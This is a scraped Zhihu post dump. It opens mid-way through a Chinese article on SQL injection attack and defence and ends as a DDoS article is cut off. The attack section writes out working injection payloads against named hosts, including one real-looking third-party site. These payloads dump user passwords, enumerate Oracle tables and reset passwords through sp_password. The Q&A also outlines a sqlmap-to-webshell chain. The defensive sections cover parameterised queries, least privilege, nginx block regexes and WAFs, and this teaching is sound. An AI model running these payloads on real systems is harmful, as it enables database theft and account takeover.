href=\"https://link.zhihu.com/?target=http%3A//192.168.115.131/cat.php%3Fid%3D1%2520UNION%2520\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">192.168.115.131/cat.php?</span><span class=\"invisible\">id=1%20UNION%20</span><span class=\"ellipsis\"></span></a></p><p>SELECT%201,concat(login,%27:%27,password),3,4%20FROM%20users;’</p><p>接下来是用来测试是否存在基于时间的盲注和查询数据库管理员帐号密码的，拿到root账号后可以去网上破解。</p><h2><b>Mssql</b></h2><p>这个思路跟mysql一样，只是需要mssql的注释符和mysql有所不同，前者支持--，后者支持#，如图15。</p><p><a href=\"https://link.zhihu.com/?target=http%3A//www.aquaservices.co.in/authorprofile.asp%3Fid%3D13\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://www.</span><span class=\"visible\">aquaservices.co.in/auth</span><span class=\"invisible\">orprofile.asp?id=13</span><span class=\"ellipsis\"></span></a> order by 100--</p><p>Here comes the error : The order by position number 100 is out of range of the number of items</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-658fd886ea15f2e0eac153440a8d83cb_b.jpg\" data-size=\"normal\" data-rawwidth=\"807\" data-rawheight=\"280\" class=\"origin_image zh-lightbox-thumb\" width=\"807\" data-original=\"https://pic4.zhimg.com/v2-658fd886ea15f2e0eac153440a8d83cb_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;807&#39; height=&#39;280&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"807\" data-rawheight=\"280\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"807\" data-original=\"https://pic4.zhimg.com/v2-658fd886ea15f2e0eac153440a8d83cb_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-658fd886ea15f2e0eac153440a8d83cb_b.jpg\"/><figcaption>图15</figcaption></figure><p><a href=\"https://link.zhihu.com/?target=http%3A//www.aquaservices.co.in/authorprofile.asp%3Fid%3D13\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://www.</span><span class=\"visible\">aquaservices.co.in/auth</span><span class=\"invisible\">orprofile.asp?id=13</span><span class=\"ellipsis\"></span></a> and 0=1 Union All Select 1,@@version,3,4,5,6,db_name(),8--</p><p><a href=\"https://link.zhihu.com/?target=http%3A//www.aquaservices.co.in/authorprofile.asp%3Fid%3D13%3Bexec\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://www.</span><span class=\"visible\">aquaservices.co.in/auth</span><span class=\"invisible\">orprofile.asp?id=13;exec</span><span class=\"ellipsis\"></span></a> master.dbo.sp_password null,password,username;–</p><p>这里还可以执行存储过程master.dbo.sp_password直接修改数据库账号密码呢。</p><h2><b>Oracle</b></h2><p>思路也差不多，不过语法上稍微复杂点，如果语法不太熟，有个技巧，可以用sqlmap去跑PoC，如图16，按照提醒去构造畸形输入。</p><div class=\"highlight\"><pre><code class=\"language-text\">#获取数据库版本信息\nand 1=2 union select null,null,(select banner from sys.v_$version where rownum=1) from dual\n#开始爆库\nand 1=2 union select null,null,(select owner from all_tables where rownum=1) from dual\nand 1=2 union select null,null,(select owner from all_table where rownum=1 and owner&lt;&gt;&#39;第\n一个库名&#39;) from dual\nand 1=2 union select null,null,(select  table_name from user_tables where rownum=1) from Dual</code></pre></div><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-7c20fea9d9df96e4f15dbee407a9449b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"725\" data-rawheight=\"314\" class=\"origin_image zh-lightbox-thumb\" width=\"725\" data-original=\"https://pic4.zhimg.com/v2-7c20fea9d9df96e4f15dbee407a9449b_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;725&#39; height=&#39;314&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"725\" data-rawheight=\"314\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"725\" data-original=\"https://pic4.zhimg.com/v2-7c20fea9d9df96e4f15dbee407a9449b_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-7c20fea9d9df96e4f15dbee407a9449b_b.jpg\"/></figure><h2><b>mongodb</b></h2><p>上面讲的都是关系型数据库，非关系型数据库mongodb这些是不是就安全了？不是的，如图17，密码还是明文保存的呢。</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-22f295406547ce091f7ea9346a9dc2c0_b.jpg\" data-size=\"normal\" data-rawwidth=\"606\" data-rawheight=\"435\" class=\"origin_image zh-lightbox-thumb\" width=\"606\" data-original=\"https://pic1.zhimg.com/v2-22f295406547ce091f7ea9346a9dc2c0_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;606&#39; height=&#39;435&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"606\" data-rawheight=\"435\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"606\" data-original=\"https://pic1.zhimg.com/v2-22f295406547ce091f7ea9346a9dc2c0_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-22f295406547ce091f7ea9346a9dc2c0_b.jpg\"/><figcaption>图17</figcaption></figure><h2><b>为什么会发生数据库注入</b></h2><p>经过上面数据库注入的攻击测试，相信大家再也不会心怀侥幸了，因为攻击成本很低不是？那么，总结一下我们看到的，数据库注入发生的原因是什么？</p><h2><b>透过现象看本质</b></h2><p>SQL注入可以分为平台层注入和代码层注入。</p><p>前者由不安全的数据库配置或数据库平台的漏洞所致；</p><p>①不安全的数据库配置；②数据库平台存在漏洞；</p><p>后者由于开发对输入未进行细致过滤，从而执行非法数据查询。</p><p>①不当的类型处理；</p><p>②不合理的查询集处理；③不当的错误处理；</p><p>④转义字符处理不合适；⑤多个提交处理不当。</p><h2><b>代码</b></h2><p>首先，“信任，过犹不及”。很多时候，我们一直强调，站在开发者角度，用户是不可信任的，未过滤或验证用户输入以及输出数据，就是给自己挖坑。比如下面这个：</p><div class=\"highlight\"><pre><code class=\"language-php\"><span class=\"cp\">&lt;?php</span>    \n<span class=\"nv\">$username</span> <span class=\"o\">=</span> <span class=\"s2\">&#34;aaa&#34;</span><span class=\"p\">;</span>    \n<span class=\"nv\">$pwd</span> <span class=\"o\">=</span> <span class=\"s2\">&#34;fdsafda&#39; or &#39;1&#39;=&#39;1&#34;</span><span class=\"p\">;</span>  \n<span class=\"nv\">$sql</span> <span class=\"o\">=</span> <span class=\"s2\">&#34;SELECT * FROM table WHERE username = &#39;</span><span class=\"si\">{</span>$username<span class=\"si\">}</span><span class=\"s2\">&#39; AND pwd = &#39;</span><span class=\"si\">{</span>$pwd<span class=\"si\">}</span><span class=\"s2\">&#39;&#34;</span><span class=\"p\">;</span>    \n<span class=\"k\">echo</span> <span class=\"nv\">$sql</span><span class=\"p\">;</span>  <span class=\"c1\">//输出  SELECT * FROM table WHERE username = &#39;aaa&#39; AND pwd = &#39;fdsafda&#39; or &#39;1&#39;=&#39;1&#39;    \n</span><span class=\"c1\"></span><span class=\"cp\">?&gt;</span>   \n</code></pre></div><p>传说中的“万能密码”利用的后台代码差不多就是这个渣样。当然，现在几乎不可能存在了，因为人总是会吸取教训的，各种安全开发的理念还是逐渐逐渐深入人心了。</p><h2><b>数据库</b></h2><p>站在运维角度，数据库注入中运维“三宗罪”，分别是：</p><p>空密码/弱密码</p><p>“空，那么空”，我耳朵里突然想起来金志文的《空城》。</p><div class=\"highlight\"><pre><code class=\"language-text\">mysql&gt; select user,host,password from mysql.user;\n+------+-----------+----------+\n| user | host      | password |\n+------+-----------+----------+\n| root | localhost |          |\n| root | 127.0.0.1 |          |\n| root | ::1       |          |</code></pre></div><p>外网开放</p><p>数据库开放外网，还不改端口（改了也没用，因为现在都是全端口扫描的），这不是找抽吗？</p><div class=\"highlight\"><pre><code class=\"language-text\">iptables-save | grep 3306\n-A INPUT -p tcp -m tcp --dport 3306 -j ACCEPT</code></pre></div><p>用户权限控制不当</p><p>按照最小权限原则，只给账号需要的最小权限即可。</p><div class=\"highlight\"><pre><code class=\"language-text\">mysql&gt; show grants for gs@101.101.101.101;\n+-----------------------------------------------+\n| Grants for gs@101.101.101.101;                                                                    \n+-----------------------------------------------+\n| GRANT ALL PRIVILEGES ON `gameserver`.* TO &#39;wscs_gs&#39;@&#39;101.101.101.101&#39;                                          </code></pre></div><h2><b>数据库注入攻击防御</b></h2><p>上文已介绍了数据库注入的原因和形式，下文将从代码、数据库、webserver和数据分析四个层面介绍如何防御数据库注入攻击。</p><h2><b>代码</b></h2><p>SDL（Security Develop Lifecircle）：软件开发应当遵循“安全开发生命周期”，软件测试需要增加安全测试的白盒与黑盒测试。</p><p>用户是不可信的：输入输出都应当被过滤，至少应满足以下4个编码规则。</p><p>1.对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和 双&#34;-&#34;进行转换等。 </p><p>2.不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。 </p><p>3.不要把机密信息明文存放，加密或者hash掉密码和敏感的信息。 </p><p>4.应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行封装</p><p>下面我针对php和pyth的反sql注入讲2个例子，因为平时用的比较多的是ThinkPHP和Flask这2个web框架。</p><p>php</p><p>where方法使用字符串条件的时候，支持预处理（安全过滤）</p><div class=\"highlight\"><pre><code class=\"language-text\">$Model-&gt;where(&#34;id=%d and username=&#39;%s&#39; and xx=&#39;%f&#39;&#34;,array($id,$username,$xx))-&gt;select();</code></pre></div><p>模型的query和execute方法 同样支持预处理机制，例如：</p><div class=\"highlight\"><pre><code class=\"language-text\">$model-&gt;query(&#39;select * from user where id=%d and status=%d&#39;,$id,$status);\npython\ncur=db.cursor()  \nsql = &#34;INSERT INTO test2(cid, author, content) VALUES (%s, %s, %s)&#34;  #使用%s而不是&#39;%s&#39;\nsql=sql%(&#39;2&#39;,&#39;2&#39;,&#39;bb&#39;)  \ncur.execute(sql,()) \n数据库</code></pre></div><p>从架构和运维两方面谈谈如何在数据库层面进行防御。</p><p><b>架构</b></p><p>首先是架构层面，处于性能和安全考虑，可以在数据库集群与webserver等前端中间增加dbproxy的中间件，比如batis或者mycat。</p><p>DB-Proxy  batis mycat </p><p>如图18所示，Mycat中实现了mysql的预处理协议，可以接收预处理命令的处理。当使用预处理查询，也可以返回正确的二进制结果集包，通过这个预处理，可以实现对sql注入的过滤和拦截。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-16c1b386f409ad3d4bbae87af8cd980d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"603\" data-rawheight=\"385\" class=\"origin_image zh-lightbox-thumb\" width=\"603\" data-original=\"https://pic2.zhimg.com/v2-16c1b386f409ad3d4bbae87af8cd980d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;603&#39; height=&#39;385&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"603\" data-rawheight=\"385\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"603\" data-original=\"https://pic2.zhimg.com/v2-16c1b386f409ad3d4bbae87af8cd980d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-16c1b386f409ad3d4bbae87af8cd980d_b.jpg\"/></figure><p>开源SQL检测、阻断系统 Druid-sql-wall</p><p>Druid提供了WallFilter，基于SQL语义分析来实现防御SQL注入攻击。</p><p><b>运维</b></p><p>然后是运维层面，可以在进程管理、用户授权、端口开放等方面进行攻击缓解甚至遏制。</p><p><b>进程启动用户</b></p><div class=\"highlight\"><pre><code class=\"language-text\">mysql    23400 22671  0 Mar19 ?        00:13:25 /usr/sbin/mysqld --basedir=/home/mysql --datadir=/home/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --open-files-limit=8192 --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306</code></pre></div><p><b>数据库用户授权</b></p><div class=\"highlight\"><pre><code class=\"language-text\">mysql&gt; show grants for gs@101.101.101.101;                                                           \n| GRANT SELECT,INSERT,DELETE,UPDATE,USAGE PRIVILEGES ON `gameserver`.* TO &#39;gs&#39;@&#39;10.10.10.10&#39; BY PASSWORD &#39;*89DCA7B59FD064E3A478xxxxxxxxxF272E7E&#39;</code></pre></div><p><b>iptables</b></p><div class=\"highlight\"><pre><code class=\"language-text\">-A INPUT -p tcp -m tcp --dport 3306 -j MYSQL\n-A MYSQL -p tcp -m tcp --dport 3306 -j REJECT --reject-with icmp-port-unreachable</code></pre></div><h2><b>Webserver</b></h2><p>接下来，除了前面讲的代码、数据库层面进行数据库注入的防御，其实如果有web前端，一般还是可以在webserver层面进行拦截，实现一个多层次的、立体的防护体系。</p><p>下面将介绍webserver配置、web防火墙两方面的防御思路。</p><p><b>配置，配置，还是配置</b></p><p>在websever的vhost设置查询字符串过滤，一旦用户提交的字符串存在安全隐患，直接进行拦截，由于这个匹配度很高，误杀可能性很低，但是在业务量比较大的情况下，会损耗webserver一定性能。</p><div class=\"highlight\"><pre><code class=\"language-text\">server {\nset $block_sql_injections 0;\nif ($query_string ~ “union.*select.*(“) {\nset $block_sql_injections 1;\n}\nif ($query_string ~ “union.*all.*select.*”) {\nset $block_sql_injections 1;\n}\nif ($query_string ~ “concat.*(“) {\nset $block_sql_injections 1;\n}\nif ($block_sql_injections = 1) {\nreturn 444;\n}\n </code></pre></div><p><b>Waf</b></p><p>全称是web application firewall，跟websever耦合度很高，一般是作为webserver的插件编译安装进去，常见的方案有下面几种：</p><p>tengine_waf：基于Nginx二次开发的Tengine的waf模块。</p><p>nginx+Sysguard：Nginx定制版waf</p><p>nginx+HTTPGuard：Nginx定制版waf</p><p>Apache+Mod_security：Mod_security其实支持Apache和Nginx，原生的支持Apache，是很通用的一种方案。</p><p>一般waf支持的功能是在以下层面进行匹配、过滤。</p><p>user-agent      匹配拦截恶意的user-agent</p><p>url             匹配拦截恶意的网页路径</p><p>args    匹配拦截恶意的GET请求参数</p><p>post            匹配拦截恶意的post请求参数</p><p>cookie          匹配拦截恶意的cookie 请求</p><p>whitetip         ip白名单</p><p>whiteurl         网页路径白名单</p><p>blockip          ip黑名单</p><p><b>日志分析</b></p><p>在海量的webserver access.log中分析匹配攻击模型，从中发现sql注入或者getshell的敏感语句。</p><p>比如下面这个wordpress的攻击日志，通过报错或者’\\’敏感字符发现报警：</p><div class=\"highlight\"><pre><code class=\"language-text\">[07-Dec-2016 02:40:49] WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;WHERE id = -1\\&#39;&#39; at line 1 for query SELECT text, author_id, date FROM  WHERE id = -1\\&#39;</code></pre></div><p>现在通过日志大数据做安全防御的方案有这么几种：</p><p>实时检索：ELK，实时查询性能很好，也有自己的访问控制机制，需要定制。</p><p>离线分析：Hadoop，利用MapReduce等算法进行模型定制、分析、输出报告，方案参考</p><p>流处理：Storm+Spark，实时性能好，可以用作实时风控系统。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-073a451814fcf8f9df4911af19f61e31_b.jpg\" data-size=\"normal\" data-rawwidth=\"395\" data-rawheight=\"506\" class=\"content_image\" width=\"395\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;395&#39; height=&#39;506&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"395\" data-rawheight=\"506\" class=\"content_image lazy\" width=\"395\" data-actualsrc=\"https://pic2.zhimg.com/v2-073a451814fcf8f9df4911af19f61e31_b.jpg\"/><figcaption>图19</figcaption></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>数据库注入其实只是安全攻防的一个小小的领域，但是因为涉及到企业、用户数据，需要列入重点关注。但是，我们也知道，道高一尺魔高一丈，在利益的驱使下攻击不会停止，我们的防护也不会停止，这场攻防之战永不落幕。</p><h2><b>问答</b></h2><p>Q1：开发学这个sqlmap，使用上有哪些难点？手册中文版的么？</p><p>A1：如果不是基于sqlmap做二次开发，sqlmap学习门槛很低，只需要对照官方手册（有中文版，安装包的doc/translations/README-zh-CN.md）操作即可，就跟学习普通的Linux系统命令一样简单。如果开发同学想基于sqlmap做二次开发，难点主要在理解Sqlmap的整体框架，它在软件工程上被推崇备至，就是因为在设计思想、性能处理上非常值得学习。此外，还可以自定义一些Tamper文件用于绕过服务端过滤，这个比较简单，主要是字符转换。Sqlmap的学习手册可以参考：<u><a href=\"https://link.zhihu.com/?target=http%3A//www.secbox.cn/hacker/6311.html%25E3%2580%2582\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">http://www.secbox.cn/hacker/6311.html。</a></u></p><p>Q2：攻击工具常用的有哪些？</p><p>A2：不同类型的攻击常用工具都不同，这个回答起来太泛了。这里我们单纯讲数据库注入需要用到的，信息收集通常使用nmap扫描开放端口、御剑扫描网站目录，漏洞发现通常基于信息收集使用AWVS或者OpenVas进行web或系统漏洞扫描，如果发现sql注入，则分别使用sqlmap、pangolin（穿山甲）等工具进行自动渗透，然后再基于漏洞点的权限决定通过后台上传还是直接写一句话木马到站点，之后，使用中国菜刀（一句话木马连接工具）连接，再往后的攻击主要靠思路，没什么现成工具。</p><p>Q3：waf可以检测到SQL注入的行为吗？</p><p>A3：可以。像HTTPGuard或者tengine_waf都支持SQL注入行为发现，主要原理也是依据正则表达式匹配，然后通过输出的log来报警。</p><p>Q4：请问有什么好的相关书籍或者资料推荐，系统学习安全方面的知识</p><p>A4：1.建议先从web安全入门，推荐《白帽子讲Web安全》，同时学习Linux系统基础知识，推荐《跟阿铭学linux》。系统安全可以看2.资料可以参考别人整理的Github上安全知识仓库：<a href=\"https://link.zhihu.com/?target=http%3A//www.uedbox.com/github-security-repo-collection/\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://www.</span><span class=\"visible\">uedbox.com/github-secur</span><span class=\"invisible\">ity-repo-collection/</span><span class=\"ellipsis\"></span></a>；以及知乎上面的专栏文章：<a href=\"https://zhuanlan.zhihu.com/p/25661457\" class=\"internal\"><span class=\"invisible\">https://</span><span class=\"visible\">zhuanlan.zhihu.com/p/25</span><span class=\"invisible\">661457</span><span class=\"ellipsis\"></span></a>。</p><p>Q5：市场上有什么防数据库注入的解决方案吗？</p><p>A5：没有单独的防数据库注入的产品或者商业方案，一般作为入侵检测系统的子功能，或者web站点安全防护解决方案的一部分。传统安全厂商启明星辰、绿盟都有入侵检测产品，web方面的360和安全狗用的比较多。如果是自己实现，就是本次分享提到的代码、数据库、webserver、日志分析等几个层面的方案。</p><p>Q6：科普下肉鸡是什么？</p><p>A6：肉鸡也称傀儡机，是指可以被黑客远程控制的机器。受害者被诱导点击或者机器被黑客攻破或机器有漏洞被种植了木马，黑客借此随意操纵服机器并利用它做任何事情，比如DDoS。</p><p>Q7：可以用admin权限，上传一个1像素的木马到主页上抓肉鸡，不是更好吗？</p><p>A7：你这里说的应该是网页挂马，也是抓肉鸡的一种方式。但是要获取admin权限，作为非法用户，本身就要通过入侵去实现的。</p><p>Q8：那些搞破解的是不是专做这些事？</p><p>A8：数据库注入跟破解其实不是一个领域的问题，破解更多的是应用程序的逆向，比如破解商业软件的License之类的。</p><h2><b>参考资料</b></h2><p>社工库问答 ：<a href=\"https://www.zhihu.com/question/22827473\" class=\"internal\"><span class=\"invisible\">https://www.</span><span class=\"visible\">zhihu.com/question/2282</span><span class=\"invisible\">7473</span><span class=\"ellipsis\"></span></a></p><p>个人信息泄漏源：<a href=\"https://link.zhihu.com/?target=http%3A//business.sohu.com/20160917/n468557286.shtml\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">business.sohu.com/20160</span><span class=\"invisible\">917/n468557286.shtml</span><span class=\"ellipsis\"></span></a></p><p>SQL注入基础：<a href=\"https://link.zhihu.com/?target=http%3A//blog.csdn.net/pan_cras/article/details/52168448\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">blog.csdn.net/pan_cras/</span><span class=\"invisible\">article/details/52168448</span><span class=\"ellipsis\"></span></a></p><p>SQL注入原理：<a href=\"https://link.zhihu.com/?target=http%3A//blog.csdn.net/stilling2006/article/details/8526458/\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">blog.csdn.net/stilling2</span><span class=\"invisible\">006/article/details/8526458/</span><span class=\"ellipsis\"></span></a></p>", 
            "topic": [
                {
                    "tag": "SQL 注入", 
                    "tagLink": "https://api.zhihu.com/topics/19678733"
                }, 
                {
                    "tag": "数据安全", 
                    "tagLink": "https://api.zhihu.com/topics/19552559"
                }, 
                {
                    "tag": "信息安全", 
                    "tagLink": "https://api.zhihu.com/topics/19561983"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/43449162", 
            "userName": "tuhao", 
            "userLink": "https://www.zhihu.com/people/5353f3263f6ecf860f2db3e773960f09", 
            "upvote": 2, 
            "title": "DDoS攻击与防御：从原理到实践", 
            "content": "<h2>温馨提示：以下内容仅供技术交流</h2><h2><b>可怕的DDoS</b></h2><p>出于打击报复、敲诈勒索、政治需要等各种原因，加上攻击成本越来越低、效果特别明显等特点，DDoS攻击已经演变成全球性网络安全威胁。</p><h2><b>危害</b></h2><p>根据卡巴斯基2016Q3的调查报告，DDoS攻击造成61%的公司无法访问其关键业务信息，38%公司无法访问其关键业务，33%的受害者因此有商业合同或者合同上的损失。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-c434c239e2af49e04d9dfe5bb4fd9e25_b.jpg\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"686\" class=\"origin_image zh-lightbox-thumb\" width=\"550\" data-original=\"https://pic2.zhimg.com/v2-c434c239e2af49e04d9dfe5bb4fd9e25_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;550&#39; height=&#39;686&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"686\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"550\" data-original=\"https://pic2.zhimg.com/v2-c434c239e2af49e04d9dfe5bb4fd9e25_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-c434c239e2af49e04d9dfe5bb4fd9e25_b.jpg\"/><figcaption>图1</figcaption></figure><h2><b>趋势</b></h2><p>总结起来，现在的DDoS攻击具有以下趋势：</p><p>1.国际化</p><p>现在的DDoS攻击越来越攻国际化，而我国已经成为仅次于美国的第二大DDoS攻击受害国，而国内的DDoS攻击源海外占比也越来越高。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-cd8f0a1aecd865f7158185ec307d7fb7_b.jpg\" data-size=\"normal\" data-rawwidth=\"822\" data-rawheight=\"403\" class=\"origin_image zh-lightbox-thumb\" width=\"822\" data-original=\"https://pic4.zhimg.com/v2-cd8f0a1aecd865f7158185ec307d7fb7_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;822&#39; height=&#39;403&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"822\" data-rawheight=\"403\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"822\" data-original=\"https://pic4.zhimg.com/v2-cd8f0a1aecd865f7158185ec307d7fb7_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-cd8f0a1aecd865f7158185ec307d7fb7_b.jpg\"/><figcaption>图2</figcaption></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>2.超大规模化</p><p>因为跨网调度流量越来越方便、流量购买价格越来越低廉，现在DDoS攻击流量规模越来越大。特别是2014年底某云还遭受了高达450Gbps的攻击。</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-1f6bad9a0581ba4ea4c568da418f12c7_b.jpg\" data-size=\"normal\" data-rawwidth=\"629\" data-rawheight=\"379\" class=\"origin_image zh-lightbox-thumb\" width=\"629\" data-original=\"https://pic4.zhimg.com/v2-1f6bad9a0581ba4ea4c568da418f12c7_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;629&#39; height=&#39;379&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"629\" data-rawheight=\"379\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"629\" data-original=\"https://pic4.zhimg.com/v2-1f6bad9a0581ba4ea4c568da418f12c7_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-1f6bad9a0581ba4ea4c568da418f12c7_b.jpg\"/><figcaption>图3</figcaption></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>3.市场化</p><p>市场化势必带来成本优势，现在各种在线DDoS平台、肉鸡交易渠道层出不穷，使得攻击者可以以很低的成本发起规模化攻击。针对流量获取方式的对比可以参考下表。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-565ddaff444a0daf9b8e5144d41e22d5_b.jpg\" data-size=\"normal\" data-rawwidth=\"748\" data-rawheight=\"589\" class=\"origin_image zh-lightbox-thumb\" width=\"748\" data-original=\"https://pic2.zhimg.com/v2-565ddaff444a0daf9b8e5144d41e22d5_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;748&#39; height=&#39;589&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"748\" data-rawheight=\"589\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"748\" data-original=\"https://pic2.zhimg.com/v2-565ddaff444a0daf9b8e5144d41e22d5_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-565ddaff444a0daf9b8e5144d41e22d5_b.jpg\"/><figcaption>表1</figcaption></figure><h2><b>DDoS攻击科普</b></h2><p>DDoS的攻击原理，往简单说，其实就是利用的tcp/udp协议规律，通过占用协议栈资源或者发起大流量拥塞达到消耗目标机器性能或者网络的目的，下面我们先简单回顾TCP“三次握手”与“四次挥手”以及UDP通信流程。</p><h2><b>TCP三次握手与四次挥手</b></h2><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-ef9077e845d5aa348a45c103c690939f_b.jpg\" data-size=\"normal\" data-rawwidth=\"546\" data-rawheight=\"768\" class=\"origin_image zh-lightbox-thumb\" width=\"546\" data-original=\"https://pic4.zhimg.com/v2-ef9077e845d5aa348a45c103c690939f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;546&#39; height=&#39;768&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"546\" data-rawheight=\"768\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"546\" data-original=\"https://pic4.zhimg.com/v2-ef9077e845d5aa348a45c103c690939f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-ef9077e845d5aa348a45c103c690939f_b.jpg\"/><figcaption>图4</figcaption></figure><h2><b>TCP建立连接：三次握手</b></h2><p>1.client: syn</p><p>2.server: syn+ack</p><p>3.client: ack</p><h2><b>TCP断开连接：四次挥手</b></h2><p>1.client: fin</p><p>2.server: ack</p><p>3.server: fin</p><p>4.client: ack</p><h2><b>UDP通信流程</b></h2><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-6dfa11715b369b5527cb7ade38baa119_b.jpg\" data-size=\"normal\" data-rawwidth=\"366\" data-rawheight=\"377\" class=\"content_image\" width=\"366\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;366&#39; height=&#39;377&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"366\" data-rawheight=\"377\" class=\"content_image lazy\" width=\"366\" data-actualsrc=\"https://pic2.zhimg.com/v2-6dfa11715b369b5527cb7ade38baa119_b.jpg\"/><figcaption>图5</figcaption></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>根据上图可发现，udp通信是无连接、不可靠的，数据是直接传输的，并没有协商的过程。</p><h2><b>攻击原理与攻击危害</b></h2><p>按照攻击对象的不同，将攻击原理和攻击危害的分析分成3类，分别是攻击网络带宽资源、应用以及系统。</p><h2><b>攻击网络带宽资源</b></h2><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-861cbc47332a6ce08dd9b78a1cad14ec_b.jpg\" data-size=\"normal\" data-rawwidth=\"930\" data-rawheight=\"471\" class=\"origin_image zh-lightbox-thumb\" width=\"930\" data-original=\"https://pic1.zhimg.com/v2-861cbc47332a6ce08dd9b78a1cad14ec_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;930&#39; 